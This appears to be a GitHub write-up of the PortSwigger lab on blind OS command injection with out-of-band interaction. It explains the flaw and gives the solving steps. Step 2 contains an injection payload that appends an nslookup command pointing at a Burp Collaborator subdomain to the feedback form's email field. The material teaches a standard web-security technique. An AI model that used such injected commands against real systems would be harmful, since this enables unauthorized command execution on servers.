#  Blind OS Command Injection with Out-of-Band Interaction

## 📌 Lab Details
- **Title**: Blind OS Command Injection with Out-of-Band Interaction
- **Difficulty**: Practitioner
- **Category**: OS Command Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/6e6e115e1981ae822b7e41fcaccbc1cb96a5d85b63b42b80e3e6d35565209752?referrer=%2fweb-security%2fos-command-injection%2flab-blind-out-of-band

## 🔍 Summary
This lab demonstrates a **blind OS command injection** vulnerability where the application executes user-supplied input inside a shell command asynchronously.
Unlike traditional command injection:
- The response does not contain command output.
- Time delays are not useful.
- Output cannot be redirected to an accessible location.
However, the server is still able to make external network requests.
This allows detection of successful command execution using **out-of-band (OAST)** techniques with **Burp Collaborator**.

## 🛠 Steps to Solve
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:
   ```sh
   email=x & nslookup x.BURP-COLLABORATOR-SUBDOMAIN #
   ```
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.
4. URL encode the payload and send the request to solve the lab.

## 📖 Key Takeaways
- Blind OS command injection may not return visible output.
- Out-of-band techniques help confirm exploitation when:
  - responses are asynchronous
  - output is suppressed
  - no file write is possible
- DNS-based payloads are highly reliable for detection.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/11e8d1c1-4b65-4da4-880e-4392d1b734f6" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13c4ea6c-2d5d-4e2e-b6b6-d6926027f165" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1acfc9c9-d1f7-4ed3-bb57-825da85cb011" />
